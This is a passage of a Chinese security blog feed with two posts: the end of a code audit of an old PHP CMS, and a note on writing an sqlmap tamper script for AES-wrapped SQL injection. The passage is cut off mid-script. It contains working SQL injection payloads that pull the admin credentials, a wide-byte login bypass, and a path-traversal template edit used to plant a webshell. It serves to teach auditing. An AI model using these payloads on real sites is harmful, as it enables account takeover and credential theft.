class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getenv</code>函数用来获取一个环境变量的值。获取到的<code>$ip</code>值没有进行任务校验。</p><p>全局搜索<code>getip()</code>函数，<code>\uploads\comment.php</code>文件有用到这个函数。而且还涉及到了SQL语言操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span><br><span class="line">VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;&quot;.getip().&quot;&apos;, &apos;$is_check&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure><p>SQL注入就是要在已有的SQL查询语句上进行拼接，可以利用拼接的点就是<code>&quot;.getip().&quot;</code>这个点，首先要知道的是在SQL语句中的<code>INSERT INTO</code>来插入内容是可以一次插入多条数据的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; insert into user (id,username,password) value (&apos;1&apos;,&apos;a&apos;,&apos;a&apos;),(&apos;2&apos;,&apos;b&apos;,&apos;b&apos;);</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line">Records: 2  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| Id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | a        | a        |</span><br><span class="line">|  2 | b        | b        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>这样我们就可以先闭合前一条插入，然后利用第二条插入的数据进行SQL注入。Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;,&apos;1&apos;),(&apos;&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;6&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin),&apos;1&apos;,&apos;1</span><br></pre></td></tr></table></figure><p>可以利用<code>phpstorm</code>调试看下代入的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)</span><br><span class="line">  VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;1&apos;,&apos;1&apos;),(&apos;&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;6&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin),&apos;1&apos;,&apos;1&apos;, &apos;$is_check&apos;)&quot;;</span><br></pre></td></tr></table></figure><p>从代入结果来看，用<code>1&#39;,&#39;1&#39;),</code>来闭合第一条添加的数据，并在后面拼接插入第二条数据。<code>post_id, user_id</code>对于的是评论的<code>ID值</code>和用户的<code>ID值</code>。同时我们利用<code>content</code>来保存我们注入得到的数据内容，并显示出来。</p><p>发送请求包，对<code>X-Forwarded-For</code>插入<code>Payload</code>。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms4.jpg" alt=""></p><p>并得到返回结果</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms5.jpg" alt=""></p><p><code>getip()</code>函数也在<code>\uploads\guest_book.php</code>中利用到。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) </span><br><span class="line">VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;$online_ip&apos;, &apos;$content&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure><p>这里是用<code>$online_ip</code>来得到<code>getip()</code>函数的返回值。</p><p>同样的方法我们可以对这个点进行SQL注入。这里直接拼接前面的就行。<code>Payload</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin))#</span><br></pre></td></tr></table></figure><p>拼接后的SQL查询语句如下，<code>#</code>注释后面多余的字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) </span><br><span class="line">VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;1&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin))#&apos;, &apos;$content&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure><p><code>burpsuite</code>发送请求包</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms6.jpg" alt=""></p><p>成功注入得到数据内容。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms7.jpg" alt=""></p><h4><span id="sql注入三宽字节注入">SQL注入三（宽字节注入）</span></h4><p>在配置文件<code>\uploads\data\config.php</code>中设置了cms的默认字符集为<code>gb2312</code>为宽字节字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(&apos;BLUE_CHARSET&apos;,&apos;gb2312&apos;);</span><br></pre></td></tr></table></figure><p>同时在<code>\uploads\include\common.inc.php</code>对各种参数进行了转义处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">   $_POST = deep_addslashes($_POST);</span><br><span class="line">   $_GET = deep_addslashes($_GET);</span><br><span class="line">   $_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">   $_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>\include\mysql.class.php</code>中也有<code>MySQL</code>的默认字节为<code>GBK</code>为宽字节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function mysql($dbhost, $dbuser, $dbpw, $dbname = &apos;&apos;, $dbcharset = &apos;gbk&apos;, $connect=1)&#123;</span><br><span class="line">$func = empty($connect) ? &apos;mysql_pconnect&apos; : &apos;mysql_connect&apos;;</span><br><span class="line">if(!$this-&gt;linkid = @$func($dbhost, $dbuser, $dbpw, true))&#123;</span><br><span class="line">$this-&gt;dbshow(&apos;Can not connect to Mysql!&apos;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">if($this-&gt;dbversion() &gt; &apos;4.1&apos;)&#123;</span><br><span class="line">mysql_query( &quot;SET NAMES gbk&quot;);</span><br><span class="line">if($this-&gt;dbversion() &gt; &apos;5.0.1&apos;)&#123;</span><br><span class="line">mysql_query(&quot;SET sql_mode = &apos;&apos;&quot;,$this-&gt;linkid);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($dbname)&#123;</span><br><span class="line">if(mysql_select_db($dbname, $this-&gt;linkid)===false)&#123;</span><br><span class="line">$this-&gt;dbshow(&quot;Can&apos;t select MySQL database($dbname)!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据宽字节注入的原理：CMS中编码为<code>GB2312</code>，函数执行添加的是<code>ASCII编码</code>，MYSQL默认字符集是<code>GBK</code>。</p><p><code>%DF&#39;</code>会被PHP当中的addslashes函数转义为<code>%DF\&#39;</code> ，“\”既URL里的<code>%5C</code>，那么也就是说，<code>%DF&#39;</code>会被转成<code>%DF%5C%27</code>网站的字符集是<code>gb2312</code>，MYSQL使用的编码是<code>GBK</code>，就会认为<code>%DF%5C%27</code>是一个宽字符。也就是<code>縗&#39;</code>。这样就可以得到单引号进行注入了。</p><p>分析代码，在<code>\uploads\admin\login.php</code>文件中。登录处有如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(check_admin($admin_name, $admin_pwd))&#123;</span><br><span class="line"> update_admin_info($admin_name);</span><br><span class="line"> if($remember == 1)&#123;</span><br><span class="line"> setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400);</span><br><span class="line"> setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400);</span><br><span class="line">setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> showmsg(&apos;您输入的用户名和密码有误&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> showmsg(&apos;欢迎您 &apos;.$admin_name.&apos; 回来，现在将转向管理中心...&apos;, &apos;index.php&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>跟进函数<code>check_admin()</code>，到文件<code>\uploads\admin\include\common.fun.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function check_admin($name, $pwd)</span><br><span class="line">&#123;</span><br><span class="line">global $db;</span><br><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;);</span><br><span class="line"> if($row[&apos;num&apos;] &gt; 0)</span><br><span class="line"> &#123;</span><br><span class="line"> return true;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> return false;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是可以利用万能密码进行绕过的，但是会对单引号进行转义。这个时候就能利用宽字节注入进行单引号的逃逸了。构造如下<code>Payload</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=admin%df&apos; or 1=1#&amp;admin_pwd=1</span><br></pre></td></tr></table></figure><p>代入SQL语句拼接结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;admin%df&apos; or 1=1#&apos; and pwd = md5(&apos;1&apos;)&quot;);</span><br></pre></td></tr></table></figure><p>语句返回为<code>true</code>。绕过登录认证成功登录<code>admin</code>账号。</p><p>利用<code>PHPstorm</code>断点调试跟进。</p><p>进行正常的登录，<code>PHPstorm</code>进行调试。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms8.jpg" alt=""></p><p>进入跟进到mysql类文件里</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms9.jpg" alt=""></p><p>绕过判断<code>check_admin</code>函数。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms10.jpg" alt=""></p><p>成功登录。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms11.jpg" alt=""></p><h4><span id="本地文件包含">本地文件包含</span></h4><p>在目录<code>\uploads\admin\tpl_manage.php</code>文件中有可以进行模板文件编辑的功能。</p><p>打开目标模板文件代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;edit&apos;)&#123;</span><br><span class="line">$file = $_GET[&apos;tpl_name&apos;];</span><br><span class="line">if(!$handle = @fopen(BLUE_ROOT.&apos;templates/default/&apos;.$file, &apos;rb&apos;))&#123;</span><br><span class="line">showmsg(&apos;打开目标模板文件失败&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$tpl[&apos;content&apos;] = fread($handle, filesize(BLUE_ROOT.&apos;templates/default/&apos;.$file));</span><br><span class="line">$tpl[&apos;content&apos;] = htmlentities($tpl[&apos;content&apos;], ENT_QUOTES, GB2312);</span><br><span class="line">fclose($handle);</span><br><span class="line">$tpl[&apos;name&apos;] = $file;</span><br><span class="line">template_assign(array(&apos;current_act&apos;, &apos;tpl&apos;), array(&apos;编辑模板&apos;, $tpl));</span><br><span class="line">$smarty-&gt;display(&apos;tpl_info.htm&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><code>$file = $_GET[&#39;tpl_name&#39;];</code>以<code>GET</code>方式获取文件名，这里没有对文件名进行任何处理，直接代入<code>fopen</code>函数拼接打开文件。这里可以利用<code>../../../uploads/ad_js.php</code>包含到本地的文件。</p><p>同时在这段读取的代码下面是有一段可以编辑的代码的。编辑的代码也没有做处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;do_edit&apos;)&#123;</span><br><span class="line"> $tpl_name = !empty($_POST[&apos;tpl_name&apos;]) ? trim($_POST[&apos;tpl_name&apos;]) : &apos;&apos;;</span><br><span class="line"> $tpl_content = !empty($_POST[&apos;tpl_content&apos;]) ? deep_stripslashes($_POST[&apos;tpl_content&apos;]) : &apos;&apos;;</span><br><span class="line"> if(empty($tpl_name))&#123;</span><br><span class="line"> return false;</span><br><span class="line"> &#125;</span><br><span class="line"> $tpl = BLUE_ROOT.&apos;templates/default/&apos;.$tpl_name;</span><br><span class="line"> if(!$handle = @fopen($tpl, &apos;wb&apos;))&#123;</span><br><span class="line">showmsg(&quot;打开目标模版文件 $tpl 失败&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> if(fwrite($handle, $tpl_content) === false)&#123;</span><br><span class="line"> showmsg(&apos;写入目标 $tpl 失败&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> fclose($handle);</span><br><span class="line"> showmsg(&apos;编辑模板成功&apos;, &apos;tpl_manage.php&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>代码中的<code>$_POST[&#39;tpl_content&#39;]</code>没有做处理，可以直接修改。</p><p>这样我们可以利用这个直接在<code>/uploads/ad_js.php</code>插入一句话木马。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms12.jpg" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms13.jpg" alt=""></p><h3><span id="结语">结语</span></h3><p>这是第一次看一整套CMS的源码，之前接触到的都是CTF中常见的代码片段。整套的CMS的审计难度还是挺大的，特别是像那种MVC框架的，这套代码的结构还是相对于简单，漏洞也没有太多的过滤函数需要去进行<code>ByPass</code>的。实习的暑假阶段也快结束了，这个暑假在实习公司这边学了不少关于应急响应和漏洞挖掘方面的东西，可能是因为比自己平时自学更具有实战性，可能性和未知性吧。接下来争取每周至少整理一篇代码审计方面的博客吧，一步一步的来，慢慢往上爬。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h3&gt;&lt;span id=&quot;前言&quot;&gt;前言&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;一些想做一些代码审计的内容，之前只有做过简单的PHP代码段的审计，没有尝试过整站的代码审计的工作。所以一切重新开始，从最简单的开始。找一些比较老和简单的CMS进行代码审计的训练，熟悉
      
    
    </summary>
    
      <category term="代码审计" scheme="https://uknowsec.cn/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>SQLMap tamper编写尝试</title>
    <link href="https://uknowsec.cn/posts/notes/SQLMap-tamper%E7%BC%96%E5%86%99%E5%B0%9D%E8%AF%95.html"/>
    <id>https://uknowsec.cn/posts/notes/SQLMap-tamper编写尝试.html</id>
    <published>2018-08-09T12:26:48.000Z</published>
    <updated>2019-01-07T08:24:15.766Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><p>今天遇到了一个AES加密后的SQL注入。之前很少接触AES加解密的知识，因为CTF打的少的原因。</p><h3><span id="代码分析">代码分析</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">//解密过程</span><br><span class="line">function decode($data)&#123;</span><br><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;);</span><br><span class="line">mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br><span class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br><span class="line">if(substr(trim($data),-6)!==&apos;_mozhe&apos;)&#123;</span><br><span class="line">echo &apos;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return substr(trim($data),0,strlen(trim($data))-6);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$id=decode($_GET[&apos;id&apos;]);</span><br><span class="line">$sql=&quot;select id,title,content,time from notice where id=$id&quot;;</span><br><span class="line">$info=$link-&gt;query($sql);</span><br><span class="line">$arr=$info-&gt;fetch_assoc();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>以上是SQL注入的代码，简单的分析下代码</p><p>Mcrypt是PHP中的一个拓展模块，类似CURL。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;);</span><br><span class="line">mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br><span class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br></pre></td></tr></table></figure><p>这一部分是<code>Mcrypt</code>的关键代码，类似<code>CURL</code>的一套流程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;);</span><br></pre></td></tr></table></figure><p>以 AES, 128 CBC模式加密数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br></pre></td></tr></table></figure><p><code>mcrypt_generic_init</code>函数是用来初始化加密缓冲区的，这里指定了两个参数<code>key</code>和<code>iv</code></p><ul><li><p>key    调用 mcrypt_enc_get_key_size() 函数获得的密钥最大长度。 小于最大长度的数值都被视为非法参数。</p></li><li><p>iv 通常情况下，向量大小等于算法的分组大小。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br></pre></td></tr></table></figure><p>相当于关闭缓冲区。</p><p><code>mdecrypt_generic</code>函数是解密函数，与之对应的是<code>mcrypt_generic</code>即用来加密的函数。</p><p>这里我们可以知道传入的<code>id</code>值经过两次<code>base64</code>解密，然后经过<code>AES</code>解密。进入后面的<code>if</code>判断.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(substr(trim($data),-6)!==&apos;_mozhe&apos;)&#123;</span><br><span class="line">echo &apos;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return substr(trim($data),0,strlen(trim($data))-6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>if</code>判断是用来分隔字符的。通过判断上面解密得到的<code>data</code>值的后六位是否为<code>_mozhe</code>。</p><p>若不是则302跳转，若是则分隔字符串去除<code>_mozhe</code>。即<code>1_mozhe</code>经过分隔得到<code>1</code>。</p><h3><span id="php加密脚本">PHP加密脚本</span></h3><p>加密脚本很简单 只需要根据解密的反过来写就可以了。</p><p>解密的过程流程图如下</p><p><code>data-&gt;base64_decode-&gt;base64_decode-&gt;AES_decode-&gt;strlen(trim($data))-6-&gt;id</code></p><p>加密过程的流程图如下</p><p><code>id-&gt;id + _mozhe-&gt;AES_encode-&gt;base64_encode-&gt;base64_encode-&gt;data</code></p><p>按照流程图的顺序，php加密的代码就可以得到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function encode($data)&#123;</span><br><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;);</span><br><span class="line">mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br><span class="line">$data = $data .&apos;_mozhe&apos;;</span><br><span class="line">$data = mcrypt_generic($td,$data);</span><br><span class="line">$data=base64_encode(base64_encode($data));</span><br><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br><span class="line">return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们得到了加密的函数，把需要注入的SQL语句代码函数得到加密密文就可以进行注入了。</p><h3><span id="tamper编写">tamper编写</span></h3><p>这个注入是可以用SQLMap来跑的，这里我们可以编写一个<code>tamper</code>脚本来进行。</p><p>这也是我写这个笔记的目的，进行一次<code>tamper</code>脚本编写的尝试。</p><p>我用自己很蹩脚的<code>Python</code>编写出一个加密和解密的脚本。</p><p>解密脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES  </span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def decrypt(text):</span><br><span class="line">    padding = &apos;\0&apos;</span><br><span class="line">    key = &apos;ydhaqPQnexoaDuW3&apos;</span><br><span class="line">    iv = &apos;2018201920202021&apos;</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    return cipher.decrypt(base64.b64decode(base64.b64decode(text)).rstrip(padding))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">print decrypt(&apos;ZUlJOGMzSmVMMHQwZHhNN3diM056Zz09&apos;)</span><br></pre></td></tr></table></figure><p>加密脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES  </span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encrypt(text):</span><br><span class="line">    padding = &apos;\0&apos;</span><br><span class="line">    key = &apos;ydhaqPQnexoaDuW3&apos;</span><br><span class="line">    iv = &apos;2018201920202021&apos;</span><br><span class="line">    pad_it = lambda s: s+(16 - len(s)%16)*padding </span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    text = text + &apos;_mozhe&apos;</span><br><span class="line">    return base64.b64encode(base64.b64encode(cipher.encrypt(pad_it(text))))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">print encrypt(&apos;1&apos;)</span><br></pre></td></tr></table></figure><p>这里我们就可以根据这个加密脚本编写tamper了。直接把函数丢进去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span><br><span class="line">See the file &apos;LICENSE&apos; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def encrypt(text):</span><br><span class="line">    padding = &apos;\0&apos;</span><br><span class="line">    key = &apos;ydhaqPQnexoaDuW3&apos;</span><br><span class="line">    iv = &apos;2018201920202021&apos;</span><br><span class="line">    pad_it = lambda s: s+(16 - len(s)%16)*padding </span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    text = text + 